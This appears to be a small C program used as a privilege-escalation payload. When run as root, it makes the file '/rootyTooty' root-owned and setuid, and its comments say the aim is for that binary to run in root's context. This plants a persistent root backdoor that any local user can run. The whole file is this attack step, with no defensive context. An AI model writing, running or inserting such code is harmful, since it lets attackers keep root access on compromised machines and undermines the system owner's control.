#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>


#define perms S_ISUID | S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP | S_IXGRP  \
	          | S_IROTH | S_IXOTH

int main(void)
{

	if (getuid() == 0) {
		/* change owner of rooty tooty to root! */
		if (chown("/rootyTooty", 0, 0) != 0)
			exit(EXIT_FAILURE);

		/* setuid rootytooty so when it runs it runs in root's
		   context and as uid 0
		*/
		if (chmod("/rootyTooty", perms) != 0)
			exit(EXIT_FAILURE);

		return EXIT_SUCCESS;
	}
	return EXIT_FAILURE;

}
